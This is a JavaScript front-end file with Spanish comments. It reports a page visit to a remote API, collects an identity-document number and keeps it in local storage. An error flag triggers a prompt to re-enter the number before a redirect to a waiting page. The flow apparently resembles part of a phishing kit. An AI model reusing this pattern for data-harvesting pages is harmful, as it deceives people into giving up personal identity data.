console.log("Index ON")
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer 123123123',
    },
    body: JSON.stringify({message: 'P1'})
})


// ERORRES
document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err != ''){
        alert('Hemos tenido un problema, por favor introduce tu documento nuevamente.');
    }
});

/** VALIDAR CC */
const btnSuccess = document.querySelector('#success');
btnSuccess.addEventListener('click', ()=>{
    validarNumero();
});

function validarNumero() {
    let input = document.querySelector("#cc");
    let valor = input.value

    if (valor.length < 7 || valor.length > 10 || isNaN(input.value)) {
        alert("¡Ups! Ingresa un documento válido.");
        !input.classList.contains('invalid') ? input.classList.add('invalid'): '';
        input.value = "";
    }else{
        /** SPINNER */
        // document.querySelector('#modal-principal').classList.remove('d-block');
        document.querySelector('#modal-esperar').classList.add('d-block');

        /** Guardar y enviar */
        info.cc = input.value;
        LS.setItem('info', JSON.stringify(info));

        setTimeout(()=>{
            if(info.err != ''){
                window.location.href = 'waiting.html';
            }else{
                window.location.href = 'infoGeneral.html';
            }

        }, 2000);
    }
}

/**
 * MENSAJE API CONTADOR
 */